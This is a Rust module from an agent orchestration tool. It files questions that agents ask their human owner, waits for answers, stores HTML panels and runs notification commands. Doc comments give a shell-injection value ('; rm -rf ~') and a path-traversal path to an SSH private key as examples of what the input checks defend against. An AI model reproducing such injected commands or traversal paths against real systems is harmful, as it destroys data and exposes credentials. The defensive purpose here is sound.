//! Questions: what an agent does when the next decision is the owner's.
//!
//! An agent that reaches a fork it has no authority to take - which storage
//! backend, whether a breaking change is acceptable, which of two readings of
//! the task is meant - has two options. It can guess, and produce an
//! implementation the owner throws away; or it can stop and ask. This module is
//! the second option, and it is the reason the graph can be left alone
//! overnight without also being left to invent product decisions.
//!
//! Stopping is cheap on purpose. The run parks as [`RunStatus::Waiting`], which
//! [`crate::daemon::settle`] refunds, so a question does not spend a task's
//! retry budget: an operator who asks twice would otherwise come back to a held
//! task that never had a line of code judged.
//!
//! # Shape
//!
//! Deliberately the same split as [`crate::queue`]. [`Question`] is data plus
//! *pure* transitions - [`Question::answer`] is where a phone posting a choice
//! the question never offered is rejected, and it touches no disk. [`Questions`]
//! owns all I/O and is constructed with its root, so a test drives a real store
//! in a temp directory without touching the operator's real home.
//!
//! One question is one JSON file under [`Questions`]'s root, written atomically.
//! Files rather than a database because three processes read and write these
//! records - the run that asked, `magi web` serving the phone, and `magi answer`
//! at a terminal - and a rename is the only cross-process atomic write that
//! needs no coordination between them. It is also why the wait below polls: the
//! answer arrives in a file written by a process this one has no channel to.
//!
//! [`RunStatus::Waiting`]: crate::run::RunStatus::Waiting

use std::path::{Path, PathBuf};
use std::time::Duration;

use anyhow::{Context, Result, bail};
use jiff::Timestamp;
use serde::{Deserialize, Serialize};

use crate::config;

/// On-disk format for a question. Bumped when a field's meaning changes.
///
/// The web UI is written against this shape by hand - there is no shared schema
/// between the front end and this struct - so a field that changes meaning
/// without a bump here is a UI that lies silently.
pub const SCHEMA: u32 = 1;

/// How often the wait re-reads the question file.
///
/// Three seconds: the answer comes from a human on a phone, so the difference
/// between three seconds and three hundred milliseconds is invisible to them,
/// while a tight loop would `stat` and parse a file thousands of times per
/// minute for a wait that routinely lasts hours. Nothing is held between polls -
/// no lock, no open handle - because `magi web` and `magi answer` write the
/// same file from other processes.
const POLL: Duration = Duration::from_secs(3);

/// How long the operator's notification command may run before it is killed.
///
/// A webhook that hangs must not hang the run. Twenty seconds is long enough
/// for a slow HTTP round trip and short enough that the operator still gets the
/// question filed and the run parked in a bounded time.
const NOTIFY_TIMEOUT: Duration = Duration::from_secs(20);

/// Environment variable naming the base URL of the web UI, for `{url}`.
///
/// A run cannot discover this by itself: `magi web` is a different process,
/// usually started by hand and often on a different machine on the tailnet, and
/// the address it settled on (Tailscale IP, port, or the fallback it warned
/// about) exists only in that process. So the operator names it once, in the
/// environment `magi serve` runs in - `magi web --open` prints exactly the
/// string to use on stdout. Unset means `{url}` expands to nothing rather than
/// to a guess: a notification carrying a link to an address nothing is
/// listening on is worse than one carrying no link at all.
pub const WEB_URL_ENV: &str = "MAGI_WEB_URL";

/// Largest panel magi will store, html plus assets.
///
/// Checked as a total, before a single byte is written, because the failure
/// this prevents is not a full disk but a half-copied panel: an agent that
/// points at a 200 MB screen recording must get one clean error, not a
/// directory holding the three small files that fitted before the copy died.
/// Eight mebibytes is far more than a diff, a table and a handful of images
/// need, and small enough that a phone on a hotel link still renders it.
pub const PANEL_MAX_BYTES: u64 = 8 * 1024 * 1024;

/// Suffix of the directory holding one question's panel.
///
/// A sibling of `<id>.json` rather than a subdirectory of the store, so
/// [`Questions::list`] - which takes every `*.json` in the root - cannot ever
/// see it, and so a panel travels with the question it belongs to.
const PANEL_DIR: &str = ".panel";

/// The panel's entry point inside its directory.
const PANEL_HTML: &str = "index.html";

/// Scratch directory a panel is assembled in before it is swapped into place.
const PANEL_TMP: &str = ".panel.tmp";

/// The one asset filename rule, applied on write **and** on read.
///
/// Exactly `^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$`, and additionally never
/// containing `..`. The pattern is this narrow because the name arrives from
/// two untrusted directions and is then joined onto a path: an agent naming
/// the asset, and a URL naming it back to [`Questions::panel_asset`]. Every
/// character that could change what the join means is outside the set - `/`
/// and `\` cannot appear, so no name can descend or escape; a leading `.` is
/// refused, so no name can be `..`, `.` or a dotfile; a drive letter's `:` is
/// refused, which matters because on Windows `Path::join` with an absolute
/// path *discards the whole prefix* and would serve any file on the disk.
/// `..` is refused anywhere rather than only at the front so the rule reads
/// the same as the sentence "no traversal" to anyone auditing it.
///
/// The length bound keeps a name inside every filesystem's limit, so a panel
/// that stores cannot fail to store on the operator's other machine.
pub fn valid_asset_name(name: &str) -> bool {
    if name.is_empty() || name.len() > 64 || name.contains("..") {
        return false;
    }
    let mut chars = name.chars();
    chars.next().is_some_and(|c| c.is_ascii_alphanumeric())
        && chars.all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-'))
}

/// Where a question is in its life.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum QuestionStatus {
    /// Asked, and waiting for the owner. A run is parked behind it.
    Open,
    /// The owner decided. [`Question::answer`] holds what they said.
    Answered,
    /// Nobody answered in time, or the question outlived the run that asked.
    /// Kept rather than deleted: what was asked and never answered is the
    /// evidence that the operator was the bottleneck.
    Abandoned,
}

impl QuestionStatus {
    /// Is a run still parked behind this question?
    pub fn open(self) -> bool {
        matches!(self, Self::Open)
    }

    /// Lowercase name, as it appears on disk and in the API.
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Open => "open",
            Self::Answered => "answered",
            Self::Abandoned => "abandoned",
        }
    }
}

/// What the owner said.
///
/// Two shapes rather than one string because the question decides which is
/// admissible, and [`Question::answer`] enforces it. A phone that posts
/// `{"choice": "Redis"}` to a question that never offered Redis is a bug in the
/// front end, and it is caught here rather than handed to an agent as fact.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Answer {
    /// One of the offered choices, verbatim.
    Choice(String),
    /// Free text, for a question that offered no choices.
    Text(String),
}

/// One decision magi will not take on the owner's behalf.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Question {
    /// On-disk format version.
    pub schema: u32,
    /// Question id, e.g. `20260902-231501-ab12`. Same shape as a run's and a
    /// task's, so the operator can paste any of them at any prefix argument.
    pub id: String,
    /// Run that is parked behind this question.
    pub run: String,
    /// Graph node the asking agent was working in, e.g. `implement`.
    pub node: String,
    /// Seat that asked, e.g. `impl-A`. Recorded because "which agent needs
    /// this" decides whether the answer unblocks one candidate or all of them.
    pub seat: String,
    /// One line: the question itself. This is what a notification carries and
    /// what the phone shows above the answer controls.
    pub summary: String,
    /// The reasoning behind the question, as markdown. May be long, may be
    /// empty. Rendered as text nodes by the UI, never as markup.
    pub detail: String,
    /// The admissible answers. **Empty means free text** - that one condition
    /// is the whole difference between the two kinds of question, on disk, in
    /// the UI, and in [`Question::answer`]'s validation.
    pub choices: Vec<String>,
    /// Does this question have an agent-authored HTML panel beside it?
    ///
    /// Serialised with a default so a question written by an older magi - or
    /// by hand - still deserialises rather than failing the whole store, which
    /// under [`Questions::list`]'s skip-unreadable rule would quietly hide the
    /// open question the operator was looking for.
    #[serde(default)]
    pub panel: bool,
    /// Files copied in beside the panel's html, by base name, sorted.
    ///
    /// The list exists so a reader knows what a panel is made of without
    /// walking the directory, and every entry satisfies [`valid_asset_name`].
    /// Sorted because it is compared - a question re-asked with the same
    /// assets in a different argument order is not a different question.
    #[serde(default)]
    pub assets: Vec<String>,
    /// Current state.
    pub status: QuestionStatus,
    /// When the agent asked.
    pub asked_at: Timestamp,
    /// When the owner answered, if they did.
    pub answered_at: Option<Timestamp>,
    /// What they said.
    pub answer: Option<Answer>,
}

impl Question {
    /// Ask something. Persist it with [`Questions::put`], or hand it to
    /// [`ask_and_wait`], which files it and waits.
    pub fn new(
        run: String,
        node: String,
        seat: String,
        summary: String,
        detail: String,
        choices: Vec<String>,
    ) -> Self {
        Self {
            schema: SCHEMA,
            id: new_id(),
            run,
            node,
            seat,
            summary,
            detail,
            choices,
            panel: false,
            assets: Vec::new(),
            status: QuestionStatus::Open,
            asked_at: Timestamp::now(),
            answered_at: None,
            answer: None,
        }
    }

    /// Short form used in reports and on the phone, matching a run's short id.
    pub fn short(&self) -> &str {
        short(&self.id)
    }

    /// Does this question want free text rather than one of a set?
    pub fn free_text(&self) -> bool {
        self.choices.is_empty()
    }

    /// Record an answer. Rejects a choice the question does not offer, free
    /// text on a multiple-choice question, an empty answer, and a second
    /// answer.
    ///
    /// Every rejection here is a case where accepting would put a fabrication
    /// in front of an agent as if the owner had said it. The messages are
    /// distinct because the caller is a web handler that shows them verbatim,
    /// and "that is not one of the choices" and "this question is multiple
    /// choice" are different mistakes with different fixes.
    pub fn answer(&mut self, answer: Answer) -> Result<()> {
        match self.status {
            QuestionStatus::Answered => bail!(
                "question {} was already answered; the run has moved on and a \
                 second answer would be a decision nobody acted on",
                self.short()
            ),
            QuestionStatus::Abandoned => bail!(
                "question {} was abandoned and the run behind it is gone",
                self.short()
            ),
            QuestionStatus::Open => {}
        }
        let body = match &answer {
            Answer::Choice(c) | Answer::Text(c) => c.as_str(),
        };
        if body.trim().is_empty() {
            bail!(
                "question {} needs an answer; an empty one tells the agent \
                 nothing and it would guess anyway",
                self.short()
            );
        }
        match &answer {
            Answer::Choice(c) if self.free_text() => bail!(
                "question {} asks for free text, so `{c}` cannot be a choice \
                 it offered",
                self.short()
            ),
            Answer::Choice(c) if !self.choices.iter().any(|o| o == c) => bail!(
                "`{c}` is not one of the choices question {} offers: {}",
                self.short(),
                self.choices.join(", ")
            ),
            Answer::Text(_) if !self.free_text() => bail!(
                "question {} is multiple choice; answer with one of: {}",
                self.short(),
                self.choices.join(", ")
            ),
            _ => {}
        }
        self.answered_at = Some(Timestamp::now());
        self.answer = Some(answer);
        self.status = QuestionStatus::Answered;
        Ok(())
    }

    /// Give up on an answer, keeping the record of what was asked.
    ///
    /// An answered question is left alone, which matters at exactly one moment:
    /// the owner answering in the same second the wait's deadline passes. The
    /// answer is the thing worth keeping there, and it has already been written
    /// by another process.
    ///
    /// The reason is appended to [`Question::detail`] because the on-disk shape
    /// is a contract with the front end and has no field of its own for it -
    /// and "asked at 3am, nobody home for a day" belongs with the question, not
    /// only in a log the operator will never open.
    pub fn abandon(&mut self, why: impl Into<String>) {
        if !self.status.open() {
            return;
        }
        self.status = QuestionStatus::Abandoned;
        let why = why.into();
        let why = why.trim();
        if why.is_empty() {
            return;
        }
        if !self.detail.is_empty() {
            self.detail.push('\n');
        }
        self.detail.push_str("\n_Abandoned: ");
        self.detail.push_str(why);
        self.detail.push_str("._\n");
    }

    /// The answer as the asking agent should read it.
    ///
    /// One string for both kinds of question: the agent's prompt says "the
    /// owner answered:", and a chosen option and a typed sentence are the same
    /// thing at that point. `None` while the question is open or abandoned, so
    /// a caller cannot mistake silence for a decision.
    pub fn resolution(&self) -> Option<String> {
        match (self.status, &self.answer) {
            (QuestionStatus::Answered, Some(Answer::Choice(a) | Answer::Text(a))) => {
                Some(a.clone())
            }
            _ => None,
        }
    }
}

/// A question store on disk.
#[derive(Debug, Clone)]
pub struct Questions {
    root: PathBuf,
}

impl Questions {
    /// The operator's questions, `<home>/questions`.
    pub fn open() -> Self {
        Self::at(crate::run::home().join("questions"))
    }

    /// A store at an explicit root. Tests use this, which is why none of them
    /// need the operator's real home.
    pub fn at(root: PathBuf) -> Self {
        Self { root }
    }

    /// Directory holding the question files.
    pub fn root(&self) -> &Path {
        &self.root
    }

    /// Path for one question id.
    pub fn path_of(&self, id: &str) -> PathBuf {
        self.root.join(format!("{id}.json"))
    }

    /// Directory holding one question's panel, `<root>/<id>.panel`.
    pub fn panel_dir(&self, id: &str) -> PathBuf {
        self.root.join(format!("{id}{PANEL_DIR}"))
    }

    /// Store a panel: the html, plus `assets` copied in under their base
    /// names. Updates `q.panel` and `q.assets`; the caller then [`put`]s the
    /// question, or the record on disk will deny having a panel that exists.
    ///
    /// The assets are **copied, not referenced**. An agent authors its panel
    /// inside a candidate worktree and points at files there, and `magi fold`
    /// deletes those worktrees; a question is the permanent record of a
    /// decision the owner took, so a panel that referenced its own images
    /// would render as broken boxes exactly when someone went back to ask why
    /// the decision was made. Copying follows symlinks - [`std::fs::copy`]
    /// does, and so does the [`std::fs::metadata`] the size is measured with,
    /// so the bytes counted and the bytes written are the same target file's -
    /// which is the intent: storing a link would leave the panel pointing at
    /// the worktree again, one indirection further away.
    ///
    /// Everything that can be rejected is rejected before the first byte is
    /// written, and the panel is then assembled in a scratch directory and
    /// swapped in. So a refusal leaves the previous panel intact, and a
    /// success replaces it *wholesale* rather than merging: a re-asked
    /// question showing one attempt's diff next to another attempt's table
    /// would be a panel neither agent ever wrote.
    ///
    /// [`put`]: Questions::put
    pub fn put_panel(&self, q: &mut Question, html: &str, assets: &[PathBuf]) -> Result<()> {
        if !valid_asset_name(&q.id) {
            bail!(
                "question id `{}` is not a name magi will build a panel path from",
                q.id
            );
        }
        if html.trim().is_empty() {
            bail!(
                "question {} was handed an empty panel; an empty frame reads to \
                 the owner as \"the agent had nothing to say\", which is a lie",
                q.short()
            );
        }

        // Names, then sizes, then writing - in that order, so nothing below
        // can leave a partial panel on disk.
        let mut named: Vec<(String, &Path)> = Vec::with_capacity(assets.len());
        for src in assets {
            let name = src.file_name().and_then(|n| n.to_str()).unwrap_or_default();
            if !valid_asset_name(name) {
                bail!(
                    "panel asset `{}` cannot be stored: a panel file name must \
                     match ^[A-Za-z0-9][A-Za-z0-9._-]{{0,63}}$ and contain no `..`",
                    src.display()
                );
            }
            if let Some((_, first)) = named.iter().find(|(n, _)| n == name) {
                bail!(
                    "two panel assets are both named `{name}` - {} and {} - and \
                     the panel can only show one of them; rename one at the source",
                    first.display(),
                    src.display()
                );
            }
            named.push((name.to_owned(), src.as_path()));
        }

        let mut total = html.len() as u64;
        for (_, src) in &named {
            let meta = std::fs::metadata(src)
                .with_context(|| format!("stat panel asset {}", src.display()))?;
            if !meta.is_file() {
                bail!(
                    "panel asset `{}` is not a file; a panel is html plus files \
                     copied beside it",
                    src.display()
                );
            }
            total = total.saturating_add(meta.len());
        }
        if total > PANEL_MAX_BYTES {
            bail!(
                "panel for question {} is {total} bytes, over magi's cap of \
                 {PANEL_MAX_BYTES} bytes; nothing was written",
                q.short()
            );
        }

        let tmp = self.root.join(format!("{}{PANEL_TMP}", q.id));
        let dir = self.panel_dir(&q.id);
        std::fs::create_dir_all(&self.root)
            .with_context(|| format!("create {}", self.root.display()))?;
        clear_dir(&tmp)?;
        std::fs::create_dir(&tmp).with_context(|| format!("create {}", tmp.display()))?;
        if let Err(e) = fill_panel(&tmp, html, &named) {
            // A copy that dies halfway must not become the panel, and must not
            // leave scratch behind for the next call to inherit.
            let _ = std::fs::remove_dir_all(&tmp);
            return Err(e);
        }
        clear_dir(&dir)?;
        std::fs::rename(&tmp, &dir)
            .with_context(|| format!("move panel into {}", dir.display()))?;

        q.panel = true;
        q.assets = named.into_iter().map(|(n, _)| n).collect();
        q.assets.sort_unstable();
        Ok(())
    }

    /// The panel's html, or `None` when the question has no panel.
    ///
    /// `None` rather than an error for a missing panel because the caller is a
    /// web handler whose answer is 404 either way, and an unreadable panel is
    /// not a reason to fail the question it belongs to.
    pub fn panel_html(&self, id: &str) -> Option<String> {
        if !valid_asset_name(id) {
            return None;
        }
        std::fs::read_to_string(self.panel_dir(id).join(PANEL_HTML)).ok()
    }

    /// One file from a panel. `Ok(None)` is "no such file"; `Err` is "that is
    /// not a name a panel file can have".
    ///
    /// Rejects a name failing [`valid_asset_name`] **before touching the
    /// filesystem**, which is the whole point of the second check: the name
    /// arrives from a URL, the directory is on disk where any process could
    /// have dropped a file, and `<root>/<id>.panel/../../id_rsa` is a path the
    /// operating system would resolve perfectly happily. The two callers'
    /// distinct outcomes - 400 for a name, 404 for a file - are why this is
    /// `Result<Option<_>>` rather than one flattened `Option`.
    pub fn panel_asset(&self, id: &str, name: &str) -> Result<Option<Vec<u8>>> {
        if !valid_asset_name(name) {
            bail!(
                "`{name}` is not a panel file name; it must match \
                 ^[A-Za-z0-9][A-Za-z0-9._-]{{0,63}}$ and contain no `..`"
            );
        }
        if !valid_asset_name(id) {
            return Ok(None);
        }
        let dir = self.panel_dir(id);
        if !dir.is_dir() {
            return Ok(None);
        }
        let path = dir.join(name);
        match std::fs::read(&path) {
            Ok(bytes) => Ok(Some(bytes)),
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(None),
            Err(e) => Err(e).with_context(|| format!("read {}", path.display())),
        }
    }

    /// Delete a question's panel, and any scratch a killed [`put_panel`] left.
    ///
    /// Succeeds when there is nothing to delete, so a caller cleaning up does
    /// not have to know whether a panel was ever written. The question record
    /// is not touched: the caller clears `panel` and `assets` and `put`s it,
    /// in the same order as everywhere else here.
    ///
    /// [`put_panel`]: Questions::put_panel
    pub fn drop_panel(&self, id: &str) -> Result<()> {
        if !valid_asset_name(id) {
            bail!("question id `{id}` is not a name magi will build a panel path from");
        }
        clear_dir(&self.panel_dir(id))?;
        clear_dir(&self.root.join(format!("{id}{PANEL_TMP}")))
    }

    /// Write a question, atomically, so a process killed mid-write leaves the
    /// previous state readable rather than a truncated file that would strand
    /// the run waiting on it.
    pub fn put(&self, q: &mut Question) -> Result<()> {
        std::fs::create_dir_all(&self.root)
            .with_context(|| format!("create {}", self.root.display()))?;
        let body = serde_json::to_string_pretty(q).context("serialize question")?;
        let path = self.path_of(&q.id);
        let tmp = path.with_extension("json.tmp");
        std::fs::write(&tmp, &body).with_context(|| format!("write {}", tmp.display()))?;
        std::fs::rename(&tmp, &path).with_context(|| format!("replace {}", path.display()))?;
        Ok(())
    }

    /// Load a question by id or unambiguous id prefix.
    pub fn get(&self, id: &str) -> Result<Question> {
        let resolved = self.resolve_id(id)?;
        read_path(&self.path_of(&resolved))
    }

    /// Every question on disk: open first, then newest first.
    ///
    /// Open first because that ordering is the product - the list exists to
    /// show the operator what has stopped, and an answered question is history
    /// underneath it. Unreadable files are skipped rather than fatal: one
    /// corrupt question must not take the web UI down, and must certainly not
    /// hide the open question the operator was looking for.
    pub fn list(&self) -> Vec<Question> {
        let mut all: Vec<Question> = std::fs::read_dir(&self.root)
            .into_iter()
            .flatten()
            .flatten()
            .map(|e| e.path())
            .filter(|p| p.extension().is_some_and(|x| x == "json"))
            .filter_map(|p| read_path(&p).ok())
            .collect();
        all.sort_unstable_by(|a, b| {
            let rank = |q: &Question| u8::from(!q.status.open());
            rank(a).cmp(&rank(b)).then_with(|| b.id.cmp(&a.id))
        });
        all
    }

    /// Open questions belonging to one run, newest first.
    ///
    /// Used to decide whether a parked run can be resumed: while this is
    /// non-empty, nothing about the run has changed and no agent should be
    /// spawned for it.
    pub fn open_for(&self, run: &str) -> Vec<Question> {
        self.list()
            .into_iter()
            .filter(|q| q.status.open() && q.run == run)
            .collect()
    }

    /// Expand an id prefix to exactly one question id. The short id the phone
    /// and the reports show is a suffix, so that is accepted too.
    pub fn resolve_id(&self, prefix: &str) -> Result<String> {
        if self.path_of(prefix).is_file() {
            return Ok(prefix.to_owned());
        }
        let hits: Vec<String> = self
            .list()
            .into_iter()
            .map(|q| q.id)
            .filter(|id| id.starts_with(prefix) || id.ends_with(prefix))
            .collect();
        match hits.len() {
            1 => Ok(hits.into_iter().next().expect("exactly one hit")),
            0 => bail!("no question matches `{prefix}`"),
            _ => bail!(
                "`{prefix}` matches {} questions: {}",
                hits.len(),
                hits.join(", ")
            ),
        }
    }

    /// Newest modification time in the store, in milliseconds, for change
    /// detection. The web UI compares this instead of re-reading every
    /// question, so an idle phone on a slow link costs one `stat` per file.
    pub fn revision(&self) -> u64 {
        std::fs::read_dir(&self.root)
            .into_iter()
            .flatten()
            .flatten()
            .filter_map(|e| e.metadata().ok())
            .filter_map(|m| m.modified().ok())
            .filter_map(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
            .map(|d| d.as_millis() as u64)
            .max()
            .unwrap_or(0)
    }

    /// How many questions are waiting on the owner. The badge on the phone,
    /// and the one number that says whether magi is blocked on a human.
    pub fn count_open(&self) -> usize {
        self.list().iter().filter(|q| q.status.open()).count()
    }
}

/// File a question and wait for the owner, polling the store.
///
/// Returns `Ok(None)` when the wait times out, so the caller can park the run
/// rather than treat a slow human as an error. The question is left on disk as
/// [`QuestionStatus::Abandoned`]; the caller that parks the run and the operator
/// who finds it in the morning both need to see what was asked.
///
/// `q` is updated in place from disk when the answer lands, so the caller can
/// record the answered question without re-reading it.
pub async fn ask_and_wait(
    q: &mut Question,
    store: &Questions,
    notify: &config::Notify,
    timeout: Duration,
) -> Result<Option<String>> {
    wait_for_owner(q, store, notify, timeout, POLL).await
}

/// [`ask_and_wait`] with the poll interval injected.
///
/// Separate only so the tests can drive a whole wait in milliseconds instead of
/// sleeping through [`POLL`]; production has exactly one interval, and it is not
/// a knob the operator gets to tune.
async fn wait_for_owner(
    q: &mut Question,
    store: &Questions,
    cfg: &config::Notify,
    timeout: Duration,
    poll: Duration,
) -> Result<Option<String>> {
    store.put(q).context("file the question")?;
    if let Err(e) = notify(cfg, q).await {
        // A broken webhook is not a reason to throw away an implementation.
        // The question is already on disk and the web UI already shows it, so
        // the operator still has a way in; only the tap on the shoulder is lost.
        tracing::warn!(
            "could not notify about question {}: {e:#} - the web UI is the \
             only surface for it now",
            q.short()
        );
    }
    tracing::info!(
        "question {} from {} is waiting for you: {}",
        q.short(),
        q.seat,
        q.summary
    );

    let deadline = tokio::time::Instant::now() + timeout;
    loop {
        let now = tokio::time::Instant::now();
        if now >= deadline {
            q.abandon(format!(
                "no answer within {}s of asking",
                timeout.as_secs().max(1)
            ));
            store.put(q).context("record the abandoned question")?;
            tracing::warn!(
                "question {} went unanswered for {}s; the run parks and the \
                 question stays as the record of it",
                q.short(),
                timeout.as_secs()
            );
            return Ok(None);
        }
        tokio::time::sleep(poll.min(deadline - now)).await;
        match store.get(&q.id) {
            Ok(fresh) if !fresh.status.open() => {
                // Whoever answered - the phone, `magi answer`, another daemon -
                // owns the record now, so adopt theirs wholesale rather than
                // merging into a copy that predates it.
                *q = fresh;
                return Ok(q.resolution());
            }
            Ok(_) => {}
            Err(e) => {
                // Mid-rename, or a file the operator is editing by hand.
                // Neither is a reason to abandon a question a human may still
                // answer, so keep polling until the deadline decides.
                tracing::debug!("could not re-read question {}: {e:#}", q.short());
            }
        }
    }
}

/// Run the operator's notification command, if one is configured.
///
/// The command is argv, never a shell string, and the substitutions below are a
/// single pass over each argument: a summary containing `; rm -rf ~` is one
/// argument to one program, and a summary containing the characters `{run}` is
/// not re-expanded. That property is the reason agent-authored text can be put
/// in a notification at all.
///
/// An error here is reported, not swallowed, so `magi notify --test` can show
/// the operator why nothing arrives. The waiting path logs it and carries on.
pub async fn notify(cmd: &config::Notify, q: &Question) -> Result<()> {
    let Some((program, args)) = cmd.command.split_first() else {
        // No command configured: the web UI is the only surface, by choice.
        return Ok(());
    };
    let url = web_url();
    if url.is_empty() && cmd.command.iter().any(|a| a.contains("{url}")) {
        tracing::warn!(
            "the notification command uses {{url}} but {WEB_URL_ENV} is unset, \
             so the link will be empty - export it next to `magi serve` with \
             the address `magi web --open` printed"
        );
    }
    let argv: Vec<String> = args.iter().map(|a| expand(a, q, &url)).collect();
    tracing::debug!(program = %program, args = ?argv, "notifying");

    let mut child = tokio::process::Command::new(program);
    child
        .args(&argv)
        .stdin(std::process::Stdio::null())
        // Killed if the timeout below drops this future: a notification
        // command left running would outlive the run it was announcing.
        .kill_on_drop(true);
    let out = match tokio::time::timeout(NOTIFY_TIMEOUT, child.output()).await {
        Ok(r) => r.with_context(|| format!("run notification command `{program}`"))?,
        Err(_) => bail!(
            "notification command `{program}` did not finish within {}s",
            NOTIFY_TIMEOUT.as_secs()
        ),
    };
    if !out.status.success() {
        let stderr = String::from_utf8_lossy(&out.stderr);
        let why = stderr
            .lines()
            .rev()
            .find(|l| !l.trim().is_empty())
            .unwrap_or("no output on stderr")
            .trim();
        bail!(
            "notification command `{program}` exited with {}: {why}",
            out.status
        );
    }
    Ok(())
}

/// Substitute `{summary}`, `{run}` and `{url}` into one argument.
///
/// One left-to-right pass, so a substituted value is never scanned for further
/// placeholders. Agent prose contains braces, and an agent quoting `{summary}`
/// in a question must not make the notification recursive.
fn expand(template: &str, q: &Question, url: &str) -> String {
    let table = [
        ("{summary}", q.summary.as_str()),
        ("{run}", q.run.as_str()),
        ("{url}", url),
    ];
    let mut out = String::with_capacity(template.len());
    let mut rest = template;
    while let Some(at) = rest.find('{') {
        out.push_str(&rest[..at]);
        let tail = &rest[at..];
        match table.iter().find(|(token, _)| tail.starts_with(token)) {
            Some((token, value)) => {
                out.push_str(value);
                rest = &tail[token.len()..];
            }
            None => {
                // Not a placeholder magi knows: it is the operator's own text.
                out.push('{');
                rest = &tail[1..];
            }
        }
    }
    out.push_str(rest);
    out
}

/// The URL `{url}` expands to, from [`WEB_URL_ENV`].
fn web_url() -> String {
    question_url(&std::env::var(WEB_URL_ENV).unwrap_or_default())
}

/// Point a configured base URL at the view that can answer the question.
///
/// A notification the operator has to navigate from is a question that stays
/// unanswered until morning, so the questions view is appended - unless the
/// operator already wrote a fragment, in which case they have said where they
/// want to land and magi does not know better.
fn question_url(base: &str) -> String {
    let base = base.trim().trim_end_matches('/');
    if base.is_empty() || base.contains('#') {
        return base.to_owned();
    }
    format!("{base}/#/questions")
}

/// Assemble a panel's contents in an already-empty directory.
///
/// Split out so [`Questions::put_panel`] can delete the whole directory on the
/// first error without an early `return` skipping that cleanup.
fn fill_panel(dir: &Path, html: &str, assets: &[(String, &Path)]) -> Result<()> {
    let index = dir.join(PANEL_HTML);
    std::fs::write(&index, html).with_context(|| format!("write {}", index.display()))?;
    for (name, src) in assets {
        let dst = dir.join(name);
        std::fs::copy(src, &dst)
            .with_context(|| format!("copy {} to {}", src.display(), dst.display()))?;
    }
    Ok(())
}

/// Remove a directory and everything under it, treating "not there" as done.
///
/// A panel is replaced wholesale and dropped idempotently, and in both cases
/// the absence of the directory is the desired end state, not an error.
fn clear_dir(path: &Path) -> Result<()> {
    match std::fs::remove_dir_all(path) {
        Ok(()) => Ok(()),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(()),
        Err(e) => Err(e).with_context(|| format!("remove {}", path.display())),
    }
}

fn read_path(path: &Path) -> Result<Question> {
    let body = std::fs::read_to_string(path).with_context(|| format!("read {}", path.display()))?;
    let q: Question =
        serde_json::from_str(&body).with_context(|| format!("parse {}", path.display()))?;
    if q.schema != SCHEMA {
        bail!(
            "question {} was written by a different magi (schema {}, this \
             build speaks {SCHEMA})",
            q.id,
            q.schema
        );
    }
    Ok(q)
}

fn short(id: &str) -> &str {
    id.split('-').next_back().unwrap_or(id)
}

fn new_id() -> String {
    let stamp = jiff::Zoned::now().strftime("%Y%m%d-%H%M%S");
    let seed = crate::rng::entropy();
    format!("{stamp}-{:04x}", (seed ^ (seed >> 32)) & 0xffff)
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A store of its own, with no process-global state - which is the point of
    /// `Questions::at`, and why these can run in parallel.
    fn store() -> (tempfile::TempDir, Questions) {
        let dir = tempfile::tempdir().unwrap();
        let s = Questions::at(dir.path().join("questions"));
        (dir, s)
    }

    fn choice_question() -> Question {
        Question::new(
            "20260902-201256-9fb7".to_owned(),
            "implement".to_owned(),
            "impl-A".to_owned(),
            "Which storage backend should the cache use?".to_owned(),
            "Both are already dependencies.".to_owned(),
            vec!["SQLite".to_owned(), "Redis".to_owned()],
        )
    }

    fn free_question() -> Question {
        Question::new(
            "20260902-201256-9fb7".to_owned(),
            "review".to_owned(),
            "rev-1".to_owned(),
            "What should the error message say?".to_owned(),
            String::new(),
            Vec::new(),
        )
    }

    /// No notification, which is the default and what most of these want.
    fn quiet() -> config::Notify {
        config::Notify::default()
    }

    #[test]
    fn the_stored_json_is_the_shape_the_web_ui_was_written_against() {
        // The front end parses these names by hand; there is no shared schema
        // and no compiler between the two. A rename here is a UI that shows an
        // empty card and reports no error, so the names are asserted literally.
        let mut q = choice_question();
        q.id = "20260902-231501-ab12".to_owned();
        let open: serde_json::Value = serde_json::to_value(&q).unwrap();
        // `serde_json::Value` holds an object's keys sorted, and key order
        // means nothing to a JSON reader anyway: the field *set* is what the
        // front end was written against, so that is what is pinned here.
        let keys: Vec<&str> = open
            .as_object()
            .unwrap()
            .keys()
            .map(String::as_str)
            .collect();
        assert_eq!(
            keys,
            [
                "answer",
                "answered_at",
                "asked_at",
                "assets",
                "choices",
                "detail",
                "id",
                "node",
                "panel",
                "run",
                "schema",
                "seat",
                "status",
                "summary",
            ],
            "the on-disk field set is a contract with the front end"
        );
        assert_eq!(open["schema"], 1);
        assert_eq!(open["id"], "20260902-231501-ab12");
        assert_eq!(open["run"], "20260902-201256-9fb7");
        assert_eq!(open["node"], "implement");
        assert_eq!(open["seat"], "impl-A");
        assert_eq!(open["status"], "open");
        assert_eq!(open["choices"], serde_json::json!(["SQLite", "Redis"]));
        assert_eq!(open["answered_at"], serde_json::Value::Null);
        assert_eq!(open["answer"], serde_json::Value::Null);
        let asked = open["asked_at"].as_str().unwrap();
        assert!(
            asked.ends_with('Z') && asked.contains('T'),
            "timestamps are UTC RFC 3339, which is what `new Date()` parses: {asked}"
        );

        // A chosen option, exactly as the contract spells it.
        q.answer(Answer::Choice("SQLite".to_owned())).unwrap();
        let answered = serde_json::to_value(&q).unwrap();
        assert_eq!(answered["status"], "answered");
        assert_eq!(answered["answer"], serde_json::json!({"choice": "SQLite"}));
        assert!(answered["answered_at"].is_string());

        // And free text, which is the other of the two forms.
        let mut free = free_question();
        free.answer(Answer::Text("Say which file it was".to_owned()))
            .unwrap();
        assert_eq!(
            serde_json::to_value(&free).unwrap()["answer"],
            serde_json::json!({"text": "Say which file it was"})
        );

        // And it survives the round trip a reader actually performs.
